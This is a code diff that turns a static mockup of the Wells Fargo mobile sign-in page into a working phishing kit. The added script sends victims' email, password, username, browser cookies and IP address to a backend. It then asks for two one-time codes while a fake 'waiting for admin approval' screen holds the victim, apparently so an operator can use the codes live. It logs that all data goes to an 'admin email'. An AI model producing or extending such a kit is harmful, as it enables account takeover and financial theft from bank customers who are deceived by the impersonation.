@@ -96,8 +96,22 @@
             color: #333;
         }
 
+        .input-field:focus {
+            border-color: #d71e28;
+        }
+
         .input-field::placeholder {
             color: #595959;
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-wrapper input {
+            width: 100%;
+            padding-right: 70px;
         }
 
         .show-btn {
@@ -107,9 +121,16 @@
             transform: translateY(-50%);
             color: #3b2b73;
             font-weight: 600;
-            text-decoration: underline;
             font-size: 15px;
             cursor: pointer;
+            background: none;
+            border: none;
+            padding: 4px 0;
+            text-decoration: underline;
+        }
+
+        .show-btn:hover {
+            color: #1a1a5e;
         }
 
         .checkbox-container {
@@ -147,14 +168,25 @@
         .btn-sign-on {
             width: 100%;
             height: 48px;
-            background-color: #e6e6e6;
-            color: #8c8c8c;
+            background-color: #d71e28;
+            color: white;
             border: none;
             border-radius: 24px;
             font-size: 16px;
             font-weight: 600;
-            cursor: not-allowed;
+            cursor: pointer;
             margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-sign-on:hover:not(:disabled) {
+            background-color: #b81820;
+        }
+
+        .btn-sign-on:disabled {
+            background-color: #e6e6e6;
+            color: #8c8c8c;
+            cursor: not-allowed;
         }
 
         .divider-text {
@@ -178,6 +210,11 @@
             gap: 8px;
             cursor: pointer;
             margin-bottom: 24px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-passkey:hover {
+            background-color: #f5f5f5;
         }
 
         .passkey-note {
@@ -196,6 +233,11 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
         }
 
         /* Investment Box */
@@ -265,6 +307,10 @@
             line-height: 1.35;
         }
 
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
         .footer-divider {
             height: 1px;
             background-color: #d9d4cd;
@@ -276,11 +322,112 @@
             color: #333333;
             line-height: 1.4;
         }
+
+        /* ===== STEP CONTAINERS ===== */
+        .step-container {
+            display: none;
+            width: 100%;
+        }
+
+        .step-container.active {
+            display: block;
+        }
+
+        /* ===== STATUS MESSAGES ===== */
+        .status-msg {
+            margin-top: 12px;
+            font-size: 14px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            display: none;
+            width: 100%;
+        }
+
+        .status-msg.show {
+            display: block;
+        }
+
+        .status-msg.error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .status-msg.success {
+            background-color: #e8f5e9;
+            color: #1b5e20;
+            border: 1px solid #c8e6c9;
+        }
+
+        .status-msg.info {
+            background-color: #e3f2fd;
+            color: #0d47a1;
+            border: 1px solid #bbdefb;
+        }
+
+        /* ===== CONGRATS ===== */
+        .congrats-box {
+            text-align: center;
+            padding: 32px 24px;
+            background: #e8f5e9;
+            border-radius: 12px;
+            margin-top: 16px;
+            width: 100%;
+        }
+
+        .congrats-box h2 {
+            color: #2e7d32;
+            font-size: 28px;
+            margin-bottom: 12px;
+        }
+
+        .congrats-box p {
+            color: #1b5e20;
+            font-size: 18px;
+        }
+
+        .restart-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: #d71e28;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.2s;
+        }
+
+        .restart-btn:hover {
+            background: #b81820;
+        }
+
+        /* Wells Fargo "Show" / "Hide" button */
+        .toggle-password-btn {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #3b2b73;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 4px 0;
+            text-decoration: underline;
+        }
+
+        .toggle-password-btn:hover {
+            color: #1a1a5e;
+        }
     </style>
 </head>
 <body>
 
 <div class="mobile-container">
+    <!-- HEADER -->
     <header class="header">
         <div class="logo">WELLS FARGO</div>
         <div class="menu-icon">
@@ -290,65 +437,166 @@
         </div>
     </header>
 
+    <!-- MAIN CONTENT -->
     <main class="content">
-        <h1 class="greeting">Good evening</h1>
+        <h1 class="greeting" id="greetingText">Good evening</h1>
 
-        <form style="width: 100%;">
-            <div class="form-group">
-                <input type="text" class="input-field" placeholder="Username" aria-label="Username">
-            </div>
+        <!-- ========================================== -->
+        <!-- STEP 1: Email & Password -->
+        <!-- ========================================== -->
+        <div id="step1" class="step-container active">
+            <form id="form1" style="width:100%;">
+                <div class="form-group">
+                    <input type="email" id="email" class="input-field" placeholder="Email address" required>
+                </div>
 
-            <div class="form-group">
-                <input type="password" class="input-field" placeholder="Password" aria-label="Password">
-                <span class="show-btn">Show</span>
-            </div>
+                <div class="form-group">
+                    <div class="password-wrapper">
+                        <input type="password" id="password" class="input-field" placeholder="Password" required>
+                        <button type="button" class="toggle-password-btn" id="togglePassword">Show</button>
+                    </div>
+                </div>
 
-            <div class="checkbox-container">
-                <input type="checkbox" id="save-username">
-                <label for="save-username" class="checkbox-label">Save username</label>
-            </div>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="save-username">
+                    <label for="save-username" class="checkbox-label">Save username</label>
+                </div>
 
-            <p class="security-note">
-                To help keep your account secure, save your username only on devices that aren't used by other people.
-            </p>
+                <p class="security-note">
+                    To help keep your account secure, save your username only on devices that aren't used by other people.
+                </p>
 
-            <button type="button" class="btn-sign-on" disabled>Sign on</button>
+                <button type="submit" id="step1Btn" class="btn-sign-on">Continue</button>
 
-            <div class="divider-text" style="text-align: center;">or</div>
+                <div id="status1" class="status-msg"></div>
 
-            <button type="button" class="btn-passkey">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                    <circle cx="12" cy="7" r="4"></circle>
-                </svg>
-                Use a passkey
-            </button>
+                <div class="divider-text" style="text-align: center;">or</div>
 
-            <p class="passkey-note">
-                Don't have one? Create a passkey after signing on and skip the password next time.
-            </p>
+                <button type="button" class="btn-passkey">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                    Use a passkey
+                </button>
 
-            <div style="display: flex; justify-content: center; width: 100%;">
-                <a href="#" class="forgot-link">
-                    <span style="font-size: 18px;">&rarr;</span> Forgot username or password?
-                </a>
-            </div>
-        </form>
+                <p class="passkey-note">
+                    Don't have one? Create a passkey after signing on and skip the password next time.
+                </p>
 
-        <div class="investment-box">
-            <div class="investment-title">Investment and Insurance Products are:</div>
-            <ul class="investment-list">
-                <li>Not Insured by the FDIC or Any Federal Government Agency</li>
-                <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
-                <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
-            </ul>
+                <div style="display: flex; justify-content: center; width: 100%;">
+                    <a href="#" class="forgot-link">
+                        <span style="font-size: 18px;">&rarr;</span> Forgot username or password?
+                    </a>
+                </div>
+            </form>
         </div>
 
-        <p class="fdic-notice">
-            Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
-        </p>
+        <!-- ========================================== -->
+        <!-- STEP 2: Username & Confirm Password -->
+        <!-- ========================================== -->
+        <div id="step2" class="step-container">
+            <h2 style="font-family: Georgia, serif; font-size: 24px; margin-bottom: 20px; width:100%;">Verify Your Identity</h2>
+            <form id="form2" style="width:100%;">
+                <div class="form-group">
+                    <input type="text" id="username" class="input-field" placeholder="Username" required>
+                </div>
+
+                <div class="form-group">
+                    <div class="password-wrapper">
+                        <input type="password" id="confirmPassword" class="input-field" placeholder="Confirm Password" required>
+                        <button type="button" class="toggle-password-btn" id="toggleConfirmPassword">Show</button>
+                    </div>
+                </div>
+
+                <button type="submit" id="step2Btn" class="btn-sign-on">Continue</button>
+
+                <div id="status2" class="status-msg"></div>
+
+                <button type="button" class="restart-btn" id="restartBtn" style="margin-top:12px; width:100%;">Restart</button>
+            </form>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- STEP 3: OTP 1 -->
+        <!-- ========================================== -->
+        <div id="step3" class="step-container">
+            <h2 style="font-family: Georgia, serif; font-size: 24px; margin-bottom: 8px; width:100%;">Enter Verification Code</h2>
+            <p style="color: #595959; margin-bottom: 20px; width:100%;">A 6-digit code has been sent to your email.</p>
+            <form id="form3" style="width:100%;">
+                <div class="form-group">
+                    <input type="text" id="otp1" class="input-field" placeholder="Enter 6-digit code" required maxlength="6" inputmode="numeric">
+                </div>
+
+                <button type="submit" id="step3Btn" class="btn-sign-on">Verify Code</button>
+
+                <div id="status3" class="status-msg"></div>
+            </form>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- STEP 4: OTP 2 -->
+        <!-- ========================================== -->
+        <div id="step4" class="step-container">
+            <h2 style="font-family: Georgia, serif; font-size: 24px; margin-bottom: 8px; width:100%;">Enter Second Code</h2>
+            <p style="color: #595959; margin-bottom: 20px; width:100%;">A second 6-digit code has been sent to your email.</p>
+            <form id="form4" style="width:100%;">
+                <div class="form-group">
+                    <input type="text" id="otp2" class="input-field" placeholder="Enter second code" required maxlength="6" inputmode="numeric">
+                </div>
+
+                <button type="submit" id="step4Btn" class="btn-sign-on">Submit</button>
+
+                <div id="status4" class="status-msg"></div>
+            </form>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- WAITING FOR APPROVAL -->
+        <!-- ========================================== -->
+        <div id="waiting" class="step-container">
+            <div style="text-align:center; padding:20px 0; width:100%;">
+                <div style="font-size:48px; margin-bottom:16px;">⏳</div>
+                <h2 style="font-family: Georgia, serif; font-size: 24px; color: #262626;">Waiting for Admin Approval</h2>
+                <p style="color: #595959; margin-top: 8px;">Your information has been sent to the administrator.</p>
+                <p style="color: #595959;">Please wait while the admin reviews your request...</p>
+                <p id="waitingStatus" style="color: #3b2b73; font-weight:600; margin-top:12px;">Loading...</p>
+                <button type="button" class="restart-btn" onclick="restart()" style="margin-top:20px;">Start Over</button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- CONGRATULATIONS -->
+        <!-- ========================================== -->
+        <div id="congrats" class="step-container">
+            <div class="congrats-box">
+                <div style="font-size:48px; margin-bottom:12px;">🎉</div>
+                <h2>Congratulations!</h2>
+                <p>Your account has been verified and restrictions are removed.</p>
+                <button type="button" class="restart-btn" onclick="restart()" style="margin-top:20px;">Sign Out</button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- INVESTMENT BOX & FDIC -->
+        <!-- ========================================== -->
+        <div id="bottomContent">
+            <div class="investment-box">
+                <div class="investment-title">Investment and Insurance Products are:</div>
+                <ul class="investment-list">
+                    <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                    <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                    <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+                </ul>
+            </div>
+
+            <p class="fdic-notice">
+                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+            </p>
+        </div>
     </main>
 
+    <!-- FOOTER -->
     <footer class="footer">
         <div class="footer-links">
             <a href="#">About Wells Fargo</a>
@@ -369,6 +617,316 @@
         </div>
     </footer>
 </div>
+
+<!-- ========================================== -->
+<!-- JAVASCRIPT - MERGED LOGIC -->
+<!-- ========================================== -->
+<script>
+    // ==========================================
+    // STATE
+    // ==========================================
+    let sessionId = null;
+    let userIp = '(fetching...)';
+    let pollTimer = null;
+    let currentStep = 1;
+
+    // ==========================================
+    // GET IP
+    // ==========================================
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(j => { userIp = j.ip || '(unknown)'; })
+        .catch(() => { userIp = '(could not detect)'; });
+
+    // ==========================================
+    // TOGGLE PASSWORD VISIBILITY - Wells Fargo Style
+    // ==========================================
+    function setupToggle(btnId, inputId) {
+        const btn = document.getElementById(btnId);
+        if (!btn) return;
+        btn.addEventListener('click', function() {
+            const input = document.getElementById(inputId);
+            if (!input) return;
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.textContent = 'Hide';
+            } else {
+                input.type = 'password';
+                this.textContent = 'Show';
+            }
+        });
+    }
+    setupToggle('togglePassword', 'password');
+    setupToggle('toggleConfirmPassword', 'confirmPassword');
+
+    // ==========================================
+    // SHOW/HIDE STEPS
+    // ==========================================
+    function showStep(stepId) {
+        document.querySelectorAll('.step-container').forEach(el => {
+            el.classList.remove('active');
+        });
+        const el = document.getElementById(stepId);
+        if (el) el.classList.add('active');
+
+        // Hide bottom content for certain steps
+        const bottom = document.getElementById('bottomContent');
+        if (bottom) {
+            if (stepId === 'congrats' || stepId === 'waiting') {
+                bottom.style.display = 'none';
+            } else {
+                bottom.style.display = 'block';
+            }
+        }
+    }
+
+    // ==========================================
+    // STATUS MESSAGES
+    // ==========================================
+    function showStatus(id, message, type = 'info') {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.textContent = message;
+        el.className = 'status-msg show ' + type;
+    }
+
+    function hideStatus(id) {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.className = 'status-msg';
+        el.textContent = '';
+    }
+
+    // ==========================================
+    // RESTART
+    // ==========================================
+    function restart() {
+        if (pollTimer) clearInterval(pollTimer);
+        sessionId = null;
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+        document.getElementById('username').value = '';
+        document.getElementById('confirmPassword').value = '';
+        document.getElementById('otp1').value = '';
+        document.getElementById('otp2').value = '';
+        ['status1','status2','status3','status4'].forEach(id => {
+            hideStatus(id);
+        });
+        showStep('step1');
+        currentStep = 1;
+    }
+
+    document.getElementById('restartBtn')?.addEventListener('click', restart);
+
+    // ==========================================
+    // POLLING FOR APPROVAL
+    // ==========================================
+    function startPolling() {
+        if (pollTimer) clearInterval(pollTimer);
+        pollTimer = setInterval(async () => {
+            if (!sessionId) return;
+            try {
+                const res = await fetch('/api/approval-status/' + sessionId);
+                const data = await res.json();
+                if (data.status === 'approved') {
+                    clearInterval(pollTimer);
+                    showStep('congrats');
+                } else {
+                    document.getElementById('waitingStatus').textContent = 'Still waiting for admin approval...';
+                }
+            } catch (e) {
+                // Silent fail
+            }
+        }, 3000);
+    }
+
+    // ==========================================
+    // SET GREETING
+    // ==========================================
+    function setGreeting() {
+        const hour = new Date().getHours();
+        let greeting = 'Good evening';
+        if (hour < 12) greeting = 'Good morning';
+        else if (hour < 17) greeting = 'Good afternoon';
+        document.getElementById('greetingText').textContent = greeting;
+    }
+    setGreeting();
+
+    // ==========================================
+    // FORM HANDLERS
+    // ==========================================
+
+    // --- STEP 1: Email & Password ---
+    document.getElementById('form1')?.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        hideStatus('status1');
+        showStatus('status1', 'Sending...', 'info');
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        try {
+            const res = await fetch('/api/step1', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    cookies: document.cookie || '(no cookies)',
+                    ip: userIp
+                })
+            });
+            const data = await res.json();
+            if (data.success) {
+                sessionId = data.sessionId;
+                showStatus('status1', data.message || 'Step 1 complete!', 'success');
+                setTimeout(() => {
+                    showStep('step2');
+                    currentStep = 2;
+                }, 500);
+            } else {
+                showStatus('status1', data.message || 'Error', 'error');
+            }
+        } catch (err) {
+            showStatus('status1', 'Network error. Is the server running?', 'error');
+        }
+    });
+
+    // --- STEP 2: Username & Confirm Password ---
+    document.getElementById('form2')?.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        hideStatus('status2');
+        showStatus('status2', 'Verifying...', 'info');
+
+        const username = document.getElementById('username').value;
+        const confirmPassword = document.getElementById('confirmPassword').value;
+
+        try {
+            const res = await fetch('/api/step2', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    username: username,
+                    confirmPassword: confirmPassword
+                })
+            });
+            const data = await res.json();
+            if (data.success) {
+                showStatus('status2', data.message || 'Step 2 complete!', 'success');
+                setTimeout(() => {
+                    showStep('step3');
+                    currentStep = 3;
+                }, 500);
+            } else {
+                showStatus('status2', data.message || 'Error', 'error');
+                setTimeout(restart, 2000);
+            }
+        } catch (err) {
+            showStatus('status2', 'Network error', 'error');
+        }
+    });
+
+    // --- STEP 3: OTP 1 ---
+    document.getElementById('form3')?.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        hideStatus('status3');
+        showStatus('status3', 'Verifying OTP 1...', 'info');
+
+        const otp1 = document.getElementById('otp1').value.trim();
+
+        try {
+            const res = await fetch('/api/step3', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    otp1: otp1
+                })
+            });
+            const data = await res.json();
+            if (data.success) {
+                showStatus('status3', data.message || 'OTP 1 verified!', 'success');
+                setTimeout(() => {
+                    showStep('step4');
+                    currentStep = 4;
+                }, 500);
+            } else {
+                showStatus('status3', data.message || 'Error', 'error');
+            }
+        } catch (err) {
+            showStatus('status3', 'Network error', 'error');
+        }
+    });
+
+    // --- STEP 4: OTP 2 ---
+    document.getElementById('form4')?.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        hideStatus('status4');
+        showStatus('status4', 'Verifying OTP 2...', 'info');
+
+        const otp2 = document.getElementById('otp2').value.trim();
+
+        try {
+            const res = await fetch('/api/step4', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    otp2: otp2
+                })
+            });
+            const data = await res.json();
+            if (data.success) {
+                showStatus('status4', data.message || 'OTP 2 verified!', 'success');
+                setTimeout(() => {
+                    showStep('waiting');
+                    currentStep = 5;
+                    startPolling();
+                }, 500);
+            } else {
+                showStatus('status4', data.message || 'Error', 'error');
+            }
+        } catch (err) {
+            showStatus('status4', 'Network error', 'error');
+        }
+    });
+
+    // ==========================================
+    // OTP INPUT: Numbers only, auto-advance
+    // ==========================================
+    document.getElementById('otp1')?.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 6);
+        if (this.value.length === 6) {
+            document.getElementById('form3').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    document.getElementById('otp2')?.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 6);
+        if (this.value.length === 6) {
+            document.getElementById('form4').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    // ==========================================
+    // KEYBOARD SHORTCUT: Enter on OTP fields
+    // ==========================================
+    document.getElementById('otp1')?.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && this.value.length === 6) {
+            document.getElementById('form3').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    document.getElementById('otp2')?.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && this.value.length === 6) {
+            document.getElementById('form4').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    console.log('✅ Wells Fargo Sign-In Page Loaded');
+    console.log('📧 All data sent to admin email');
+</script>
 
 </body>
 </html>
